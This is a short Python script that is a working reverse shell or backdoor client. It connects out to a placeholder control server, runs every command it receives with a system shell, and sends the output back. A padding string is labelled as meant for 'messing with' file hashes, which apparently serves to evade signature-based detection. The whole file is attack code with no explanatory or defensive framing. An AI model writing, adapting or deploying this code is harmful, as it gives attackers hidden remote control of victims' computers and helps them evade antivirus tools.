import os
import socket
import subprocess
from pathlib import Path


# Connection Settings
HOST = 'IPORDOMAIN'
PORT = CONTROLPORT

# Part random, part padding
MessingWithHashin = "RANDOPADDDING"

commandsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#Connect to control server
commandsocket.connect((HOST, PORT))

# Set home directory
home = str(Path.home())

while True:
    data = commandsocket.recv(1024).decode()
    if data[:2] == 'cd':
        if data[:4] == 'cd ~':
            os.chdir(home)
            data = (data.replace("~", home))
        os.chdir(data[3:])
    commandsocket.send(os.getcwd().encode())
    if len(data) > 0:
        command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        shellOutput = command.stdout.read()
        shellOutput = shellOutput.decode("utf-8")
        commandsocket.send(shellOutput.encode())
    else:
        commandsocket.send(shellOutput.encode())
commandsocket.close()